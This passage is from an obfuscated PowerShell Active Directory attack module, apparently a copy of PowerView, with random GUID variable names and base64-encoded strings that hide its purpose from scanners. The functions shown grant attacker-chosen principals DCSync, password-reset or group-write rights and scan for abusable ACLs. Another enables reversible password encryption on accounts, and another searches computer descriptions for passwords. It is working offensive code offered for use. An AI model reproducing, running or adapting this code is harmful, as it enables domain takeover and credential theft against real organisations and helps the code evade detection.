                                ${fd32de5e9cbc46439e4ffecef0e84950}[$_.Name] = $_.Value
                            }
                        }
                        New-Object -TypeName PSObject -Property ${fd32de5e9cbc46439e4ffecef0e84950}
                    }
                    else { $_ }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}
function Add-ObjectAcl {
    [CmdletBinding()]
    Param (
        [String]
        ${d06510f5c8584389944956d50f449fd7},
        [String]
        ${d3edefdeede0489d8b97d572ea03d747} = "*",
        [Alias('DN')]
        [String]
        ${b2f5a5cc835c4e8cb60d16fc164335c9} = "*",
        [String]
        ${d7063ea35b4e41868285350317381bba},
        [String]
        ${b41ceec9b2d44b1ca4a9ca18bc52a2e9},
        [String]
        ${eae44c72f5824fc9bc6f3539064a28ce},
        [String]
        [ValidatePattern('^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+')]
        ${ae887278449c41e687af18e91b7341c8},
        [String]
        ${bfc067cf5a9a446a8ba8c49d171ee447},
        [String]
        ${d1b38091f37443bfbc230d7b8652efe2},
        [String]
        [ValidateSet("All","ResetPassword","WriteMembers","DCSync")]
        ${ca45c8c2e9cb42adae9008e139fbf109} = "All",
        [String]
        ${e0eb224d1773474c866b37b37b274682},
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    begin {
        ${7a1a8a62c2a9413989ed82181fa823b4} = Get-DomainSearcher -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c4d5e29aa5ae43dc97a75d43cbc64f02 ${b41ceec9b2d44b1ca4a9ca18bc52a2e9} -bbc4680c371c4b70bf799c47787e7f27 ${eae44c72f5824fc9bc6f3539064a28ce} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
        if(!${ae887278449c41e687af18e91b7341c8}) {
            ${2919a7624a3f45ef8cf1f9c435265eaa} = Get-ADObject -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -be2d982dffb8435b9bc6f279ce7309a8 ${bfc067cf5a9a446a8ba8c49d171ee447} -a7648af93b714896863ad23fbb505ae4 ${d1b38091f37443bfbc230d7b8652efe2} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
            if(!${2919a7624a3f45ef8cf1f9c435265eaa}) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAcgBlAHMAbwBsAHYAaQBuAGcAIABwAHIAaQBuAGMAaQBwAGEAbAA=')))
            }
            ${ae887278449c41e687af18e91b7341c8} = ${2919a7624a3f45ef8cf1f9c435265eaa}.objectsid
        }
        if(!${ae887278449c41e687af18e91b7341c8}) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAcgBlAHMAbwBsAHYAaQBuAGcAIABwAHIAaQBuAGMAaQBwAGEAbAA=')))
        }
    }
    process {
        if (${7a1a8a62c2a9413989ed82181fa823b4}) {
            if(${d06510f5c8584389944956d50f449fd7}) {
                ${7a1a8a62c2a9413989ed82181fa823b4}.filter="(&(samaccountname=${d06510f5c8584389944956d50f449fd7})(name=${d3edefdeede0489d8b97d572ea03d747})(distinguishedname=${b2f5a5cc835c4e8cb60d16fc164335c9})${d7063ea35b4e41868285350317381bba})"  
            }
            else {
                ${7a1a8a62c2a9413989ed82181fa823b4}.filter="(&(name=${d3edefdeede0489d8b97d572ea03d747})(distinguishedname=${b2f5a5cc835c4e8cb60d16fc164335c9})${d7063ea35b4e41868285350317381bba})"  
            }
            try {
                ${7a1a8a62c2a9413989ed82181fa823b4}.FindAll() | ? {$_} | Foreach-Object {
                    ${56a4c2f444e348f29c75cfa1fc24142f} = $_.Properties.distinguishedname
                    ${5828e99b02404b65a7b1603da00c4a11} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${ae887278449c41e687af18e91b7341c8})
                    ${1d31664589c04759b003db22e740c3e9} = [System.DirectoryServices.ActiveDirectorySecurityInheritance] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA=')))
                    ${b98e7f15532b4722951a90cf9e2882cb} = [System.Security.AccessControl.AccessControlType] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA==')))
                    ${b274ee7910f6413496184954e89a6a31} = @()
                    if(${e0eb224d1773474c866b37b37b274682}) {
                        ${e0768b3aa518442587ee8f1d4323f5aa} = @(${e0eb224d1773474c866b37b37b274682})
                    }
                    else {
                        ${e0768b3aa518442587ee8f1d4323f5aa} = Switch (${ca45c8c2e9cb42adae9008e139fbf109}) {
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQB0AFAAYQBzAHMAdwBvAHIAZAA='))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADIAOQA5ADUANwAwAC0AMgA0ADYAZAAtADEAMQBkADAALQBhADcANgA4AC0AMAAwAGEAYQAwADAANgBlADAANQAyADkA'))) }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBmADkANgA3ADkAYwAwAC0AMABkAGUANgAtADEAMQBkADAALQBhADIAOAA1AC0AMAAwAGEAYQAwADAAMwAwADQAOQBlADIA'))) }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAFMAeQBuAGMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBhAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBkAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OAA5AGUAOQA1AGIANwA2AC0ANAA0ADQAZAAtADQAYwA2ADIALQA5ADkAMQBhAC0AMABmAGEAYwBiAGUAZABhADYANAAwAGMA')))}
                        }
                    }
                    if(${e0768b3aa518442587ee8f1d4323f5aa}) {
                        foreach(${b3dcc7338bfc4d97afb02a12d590c57a} in ${e0768b3aa518442587ee8f1d4323f5aa}) {
                            ${978f3ec35ce243459a1669e3bd94a661} = New-Object Guid ${b3dcc7338bfc4d97afb02a12d590c57a}
                            ${f09123d11d1046e285de41d9e84801be} = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAFIAaQBnAGgAdAA=')))
                            ${b274ee7910f6413496184954e89a6a31} += New-Object System.DirectoryServices.ActiveDirectoryAccessRule ${5828e99b02404b65a7b1603da00c4a11},${f09123d11d1046e285de41d9e84801be},${b98e7f15532b4722951a90cf9e2882cb},${978f3ec35ce243459a1669e3bd94a661},${1d31664589c04759b003db22e740c3e9}
                        }
                    }
                    else {
                        ${f09123d11d1046e285de41d9e84801be} = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))
                        ${b274ee7910f6413496184954e89a6a31} += New-Object System.DirectoryServices.ActiveDirectoryAccessRule ${5828e99b02404b65a7b1603da00c4a11},${f09123d11d1046e285de41d9e84801be},${b98e7f15532b4722951a90cf9e2882cb},${1d31664589c04759b003db22e740c3e9}
                    }
                    Write-Verbose "Granting principal ${ae887278449c41e687af18e91b7341c8} '${ca45c8c2e9cb42adae9008e139fbf109}' on $($_.Properties.distinguishedname)"
                    try {
                        ForEach ($ACE in ${b274ee7910f6413496184954e89a6a31}) {
                            Write-Verbose "Granting principal ${ae887278449c41e687af18e91b7341c8} '$($ACE.ObjectType)' rights on $($_.Properties.distinguishedname)"
                            ${b2929ecf6cd74a84bce9ccd2f5622fbb} = [adsi]($_.path)
                            ${b2929ecf6cd74a84bce9ccd2f5622fbb}.PsBase.ObjectSecurity.AddAccessRule($ACE)
                            ${b2929ecf6cd74a84bce9ccd2f5622fbb}.PsBase.commitchanges()
                        }
                    }
                    catch {
                        Write-Warning "Error granting principal ${ae887278449c41e687af18e91b7341c8} '${ca45c8c2e9cb42adae9008e139fbf109}' on ${56a4c2f444e348f29c75cfa1fc24142f} : $_"
                    }
                }
            }
            catch {
                Write-Warning "Error: $_"
            }
        }
    }
}
function Invoke-ACLScanner {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        ${a7648af93b714896863ad23fbb505ae4},
        [String]
        ${be2d982dffb8435b9bc6f279ce7309a8} = "*",
        [Alias('DN')]
        [String]
        ${e43ac2d547a843e5940f7f80752eb771} = "*",
        [String]
        ${a48507564a8248e5b01d3a563f4bc865},
        [String]
        ${c4d5e29aa5ae43dc97a75d43cbc64f02},
        [String]
        ${bbc4680c371c4b70bf799c47787e7f27},
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [Switch]
        ${e5518a7ba66f4646a3d1f66f67f92148},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    Get-ObjectACL @PSBoundParameters | % {
        $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFMASQBEAA=='))) ($_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value)
        $_
    } | ? {
        try {
            [int]($_.IdentitySid.split("-")[-1]) -ge 1000
        }
        catch {}
    } | ? {
        ($_.ActiveDirectoryRights -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))) -or ($_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAA==')))) -or ($_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUA')))) -or ($_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUA')))) -or (($_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAFIAaQBnAGgAdAA=')))) -and ($_.AccessControlType -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA==')))))
    }
}
function Get-GUIDMap {
    [CmdletBinding()]
    Param (
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    ${e0768b3aa518442587ee8f1d4323f5aa} = @{'00000000-0000-0000-0000-000000000000' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA')))}
    ${2add2529bd044d36bfca3c909faf4481} = (Get-NetForest).schema.name
    ${52db2c32c1fa482286b5a49cdbd477cf} = Get-DomainSearcher -c4d5e29aa5ae43dc97a75d43cbc64f02 ${2add2529bd044d36bfca3c909faf4481} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
    if(${52db2c32c1fa482286b5a49cdbd477cf}) {
        ${52db2c32c1fa482286b5a49cdbd477cf}.filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGMAaABlAG0AYQBJAEQARwBVAEkARAA9ACoAKQA=')))
        try {
            ${52db2c32c1fa482286b5a49cdbd477cf}.FindAll() | ? {$_} | % {
                ${e0768b3aa518442587ee8f1d4323f5aa}[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
        }
        catch {
            Write-Debug "Error in building GUID map: $_"
        }      
    }
    ${ebdd8ccb010742e79f641a0e60bbcb9d} = Get-DomainSearcher -c4d5e29aa5ae43dc97a75d43cbc64f02 ${2add2529bd044d36bfca3c909faf4481}.replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBtAGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAC0AUgBpAGcAaAB0AHMA')))) -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
    if (${ebdd8ccb010742e79f641a0e60bbcb9d}) {
        ${ebdd8ccb010742e79f641a0e60bbcb9d}.filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBjAG8AbgB0AHIAbwBsAEEAYwBjAGUAcwBzAFIAaQBnAGgAdAApAA==')))
        try {
            ${ebdd8ccb010742e79f641a0e60bbcb9d}.FindAll() | ? {$_} | % {
                ${e0768b3aa518442587ee8f1d4323f5aa}[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
        }
        catch {
            Write-Debug "Error in building GUID map: $_"
        }
    }
    ${e0768b3aa518442587ee8f1d4323f5aa}
}
function Get-NetComputer {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        ${c096522c7bbe4c7aaadf99843e3b09fb} = '*',
        [String]
        ${a28200ed725246a29b1b7a8486b7f537},
        [String]
        ${d76bdcf1942742f8b764521cbfb67b89},
        [String]
        ${eae5323dd00f4b2ea8a6693e8fde4863},
        [String]
        ${a48507564a8248e5b01d3a563f4bc865},
        [Switch]
        ${a5ea6f0217ef4a2594efd8d19a951d11},
        [Switch]
        ${be0265651b1f4b6699aaa7db34ab7aee},
        [Switch]
        ${c489e407a44b4d378d17e6f8021054c1},
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [String]
        ${c4d5e29aa5ae43dc97a75d43cbc64f02},
        [Switch]
        ${d94ab56af5434f32a3756027d2d13aa3},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    begin {
        ${97245602be764ad88842a7dcceadd104} = Get-DomainSearcher -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c4d5e29aa5ae43dc97a75d43cbc64f02 ${c4d5e29aa5ae43dc97a75d43cbc64f02} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
    }
    process {
        if (${97245602be764ad88842a7dcceadd104}) {
            if(${d94ab56af5434f32a3756027d2d13aa3}) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAGYAbwByACAAdQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAAgAGQAZQBsAGUAZwBhAHQAaQBvAG4A')))
                ${a48507564a8248e5b01d3a563f4bc865} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADUAMgA0ADIAOAA4ACkA')))
            }
            if(${a5ea6f0217ef4a2594efd8d19a951d11}) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAHAAcgBpAG4AdABlAHIAcwA=')))
                ${a48507564a8248e5b01d3a563f4bc865} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBwAHIAaQBuAHQAUQB1AGUAdQBlACkA')))
            }
            if(${a28200ed725246a29b1b7a8486b7f537}) {
                Write-Verbose "Searching for computers with SPN: ${a28200ed725246a29b1b7a8486b7f537}"
                ${a48507564a8248e5b01d3a563f4bc865} += "(servicePrincipalName=${a28200ed725246a29b1b7a8486b7f537})"
            }
            if(${d76bdcf1942742f8b764521cbfb67b89}) {
                ${a48507564a8248e5b01d3a563f4bc865} += "(operatingsystem=${d76bdcf1942742f8b764521cbfb67b89})"
            }
            if(${eae5323dd00f4b2ea8a6693e8fde4863}) {
                ${a48507564a8248e5b01d3a563f4bc865} += "(operatingsystemservicepack=${eae5323dd00f4b2ea8a6693e8fde4863})"
            }
            ${97245602be764ad88842a7dcceadd104}.filter = "(&(sAMAccountType=805306369)(dnshostname=${c096522c7bbe4c7aaadf99843e3b09fb})${a48507564a8248e5b01d3a563f4bc865})"
            try {
                ${97245602be764ad88842a7dcceadd104}.FindAll() | ? {$_} | % {
                    ${4ec9c050c4c74ff6a6d4be971e455652} = $True
                    if(${be0265651b1f4b6699aaa7db34ab7aee}) {
                        ${4ec9c050c4c74ff6a6d4be971e455652} = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                    }
                    if(${4ec9c050c4c74ff6a6d4be971e455652}) {
                        if (${c489e407a44b4d378d17e6f8021054c1}) {
                            Convert-LDAPProperty -d90960fc83614a2fb42f43ab6aac95a1 $_.Properties
                        }
                        else {
                            $_.properties.dnshostname
                        }
                    }
                }
            }
            catch {
                Write-Warning "Error: $_"
            }
        }
    }
}
function Get-ADObject {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        ${d72c41ecfd1e4100a077ef856e028545},
        [String]
        ${be2d982dffb8435b9bc6f279ce7309a8},
        [String]
        ${a7648af93b714896863ad23fbb505ae4},
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [String]
        ${c4d5e29aa5ae43dc97a75d43cbc64f02},
        [String]
        ${a48507564a8248e5b01d3a563f4bc865},
        [Switch]
        ${bdf922e6c318437e9867b00a00c3dd4b},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    process {
        if(${d72c41ecfd1e4100a077ef856e028545}) {
            try {
                ${be2d982dffb8435b9bc6f279ce7309a8} = Convert-SidToName ${d72c41ecfd1e4100a077ef856e028545}
                if(${be2d982dffb8435b9bc6f279ce7309a8}) {
                    ${e0b5602fe635438f8f31280b0ce13d6a} = Convert-NT4toCanonical -d812a92a48c94a1ab80bf8ce2384cab2 ${be2d982dffb8435b9bc6f279ce7309a8}
                    if(${e0b5602fe635438f8f31280b0ce13d6a}) {
                        ${afa30c601e734738b32424a6234484e4} = ${e0b5602fe635438f8f31280b0ce13d6a}.split("/")[0]
                    }
                    else {
                        Write-Warning "Error resolving SID '${d72c41ecfd1e4100a077ef856e028545}'"
                        return $Null
                    }
                }
            }
            catch {
                Write-Warning "Error resolving SID '${d72c41ecfd1e4100a077ef856e028545}' : $_"
                return $Null
            }
        }
        ${27d6836e82264af8985786d03f9882f8} = Get-DomainSearcher -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c4d5e29aa5ae43dc97a75d43cbc64f02 ${c4d5e29aa5ae43dc97a75d43cbc64f02} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
        if(${27d6836e82264af8985786d03f9882f8}) {
            if(${d72c41ecfd1e4100a077ef856e028545}) {
                ${27d6836e82264af8985786d03f9882f8}.filter = "(&(objectsid=${d72c41ecfd1e4100a077ef856e028545})${a48507564a8248e5b01d3a563f4bc865})"
            }
            elseif(${be2d982dffb8435b9bc6f279ce7309a8}) {
                ${27d6836e82264af8985786d03f9882f8}.filter = "(&(name=${be2d982dffb8435b9bc6f279ce7309a8})${a48507564a8248e5b01d3a563f4bc865})"
            }
            elseif(${a7648af93b714896863ad23fbb505ae4}) {
                ${27d6836e82264af8985786d03f9882f8}.filter = "(&(samAccountName=${a7648af93b714896863ad23fbb505ae4})${a48507564a8248e5b01d3a563f4bc865})"
            }
            ${27d6836e82264af8985786d03f9882f8}.FindAll() | ? {$_} | % {
                if(${bdf922e6c318437e9867b00a00c3dd4b}) {
                    $_
                }
                else {
                    Convert-LDAPProperty -d90960fc83614a2fb42f43ab6aac95a1 $_.Properties
                }
            }
        }
    }
}
function Set-ADObject {
    [CmdletBinding()]
    Param (
        [String]
        ${d72c41ecfd1e4100a077ef856e028545},
        [String]
        ${be2d982dffb8435b9bc6f279ce7309a8},
        [String]
        ${a7648af93b714896863ad23fbb505ae4},
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [String]
        ${a48507564a8248e5b01d3a563f4bc865},
        [Parameter(Mandatory = $True)]
        [String]
        ${b8c9b0f5b9a24ff48dcb758828e4213f},
        ${c6525a7f04d342729d48e8c999ad7146},
        [Int]
        ${ece827f6411b4108a7604738bdbd8943},
        [Switch]
        ${bf487c50fb3746f6be8181c0e7438ba7},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    ${8ebfdee9dc57408c84cf62adfbe82d8c} = @{
        'SID' = ${d72c41ecfd1e4100a077ef856e028545}
        'Name' = ${be2d982dffb8435b9bc6f279ce7309a8}
        'SamAccountName' = ${a7648af93b714896863ad23fbb505ae4}
        'Domain' = ${afa30c601e734738b32424a6234484e4}
        'DomainController' = ${a3bf4f2494234d89b62febc9f379f624}
        'Filter' = ${a48507564a8248e5b01d3a563f4bc865}
        'PageSize' = ${c8e7665cd4cc41d88229c3536a114f1b}
    }
    ${1754ad0da0984305aa905f590cca6298} = Get-ADObject -bdf922e6c318437e9867b00a00c3dd4b @8ebfdee9dc57408c84cf62adfbe82d8c
    try {
        ${878315da923c4670b3efaffbde6951c3} = ${1754ad0da0984305aa905f590cca6298}.GetDirectoryEntry()
        if(${bf487c50fb3746f6be8181c0e7438ba7}) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGUAYQByAGkAbgBnACAAdgBhAGwAdQBlAA==')))
            ${878315da923c4670b3efaffbde6951c3}.${b8c9b0f5b9a24ff48dcb758828e4213f}.clear()
            ${878315da923c4670b3efaffbde6951c3}.commitchanges()
        }
        elseif(${ece827f6411b4108a7604738bdbd8943}) {
            ${5d55b94c41aa4c908115ba17f15c3614} = ${878315da923c4670b3efaffbde6951c3}.${b8c9b0f5b9a24ff48dcb758828e4213f}[0].GetType().name
            ${c6525a7f04d342729d48e8c999ad7146} = $(${878315da923c4670b3efaffbde6951c3}.${b8c9b0f5b9a24ff48dcb758828e4213f}) -bxor ${ece827f6411b4108a7604738bdbd8943} 
            ${878315da923c4670b3efaffbde6951c3}.${b8c9b0f5b9a24ff48dcb758828e4213f} = ${c6525a7f04d342729d48e8c999ad7146} -as ${5d55b94c41aa4c908115ba17f15c3614}       
            ${878315da923c4670b3efaffbde6951c3}.commitchanges()     
        }
        else {
            ${878315da923c4670b3efaffbde6951c3}.put(${b8c9b0f5b9a24ff48dcb758828e4213f}, ${c6525a7f04d342729d48e8c999ad7146})
            ${878315da923c4670b3efaffbde6951c3}.setinfo()
        }
    }
    catch {
        Write-Warning "Error setting property ${b8c9b0f5b9a24ff48dcb758828e4213f} to value '${c6525a7f04d342729d48e8c999ad7146}' for object $(${1754ad0da0984305aa905f590cca6298}.Properties.samaccountname) : $_"
    }
}
function Invoke-DowngradeAccount {
    [CmdletBinding()]
    Param (
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        ${a7648af93b714896863ad23fbb505ae4},
        [String]
        ${be2d982dffb8435b9bc6f279ce7309a8},
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [String]
        ${a48507564a8248e5b01d3a563f4bc865},
        [Switch]
        ${b9fed210b97f4bef909151f353960333}
    )
    process {
        ${8ebfdee9dc57408c84cf62adfbe82d8c} = @{
            'SamAccountName' = ${a7648af93b714896863ad23fbb505ae4}
            'Name' = ${be2d982dffb8435b9bc6f279ce7309a8}
            'Domain' = ${afa30c601e734738b32424a6234484e4}
            'DomainController' = ${a3bf4f2494234d89b62febc9f379f624}
            'Filter' = ${a48507564a8248e5b01d3a563f4bc865}
        }
        ${477642117c8241ba89a5c9a261126284} = Get-ADObject @8ebfdee9dc57408c84cf62adfbe82d8c | select useraccountcontrol | ConvertFrom-UACValue
        if(${b9fed210b97f4bef909151f353960333}) {
            if(${477642117c8241ba89a5c9a261126284}.Keys -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBOAEMAUgBZAFAAVABFAEQAXwBUAEUAWABUAF8AUABXAEQAXwBBAEwATABPAFcARQBEAA==')))) {
                Set-ADObject @8ebfdee9dc57408c84cf62adfbe82d8c -b8c9b0f5b9a24ff48dcb758828e4213f useraccountcontrol -ece827f6411b4108a7604738bdbd8943 128
            }
            Set-ADObject @8ebfdee9dc57408c84cf62adfbe82d8c -b8c9b0f5b9a24ff48dcb758828e4213f pwdlastset -c6525a7f04d342729d48e8c999ad7146 -1
        }
        else {
            if(${477642117c8241ba89a5c9a261126284}.Keys -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABPAE4AVABfAEUAWABQAEkAUgBFAF8AUABBAFMAUwBXAE8AUgBEAA==')))) {
                Set-ADObject @8ebfdee9dc57408c84cf62adfbe82d8c -b8c9b0f5b9a24ff48dcb758828e4213f useraccountcontrol -ece827f6411b4108a7604738bdbd8943 65536
            }
            if(${477642117c8241ba89a5c9a261126284}.Keys -notcontains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBOAEMAUgBZAFAAVABFAEQAXwBUAEUAWABUAF8AUABXAEQAXwBBAEwATABPAFcARQBEAA==')))) {
                Set-ADObject @8ebfdee9dc57408c84cf62adfbe82d8c -b8c9b0f5b9a24ff48dcb758828e4213f useraccountcontrol -ece827f6411b4108a7604738bdbd8943 128
            }
            Set-ADObject @8ebfdee9dc57408c84cf62adfbe82d8c -b8c9b0f5b9a24ff48dcb758828e4213f pwdlastset -c6525a7f04d342729d48e8c999ad7146 0
        }
    }
}
function Get-ComputerProperty {
    [CmdletBinding()]
    param(
        [String[]]
        ${d90960fc83614a2fb42f43ab6aac95a1},
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    if(${d90960fc83614a2fb42f43ab6aac95a1}) {
        ${d90960fc83614a2fb42f43ab6aac95a1} = ,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))) + ${d90960fc83614a2fb42f43ab6aac95a1} | sort -Unique
        Get-NetComputer -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c489e407a44b4d378d17e6f8021054c1 -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b} | select -Property ${d90960fc83614a2fb42f43ab6aac95a1}
    }
    else {
        Get-NetComputer -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c489e407a44b4d378d17e6f8021054c1 -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b} | select -first 1 | gm -MemberType *Property | select -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))
    }
}
function Find-ComputerField {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Term')]
        [String]
        ${ae2b48b0b86f414e9a06895d10c31dc2} = 'pass',
        [Alias('Field')]
        [String]
        ${cafb48fc09ca44f7b238fde16d9ec320} = 'description',
        [String]
        ${c4d5e29aa5ae43dc97a75d43cbc64f02},
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    process {
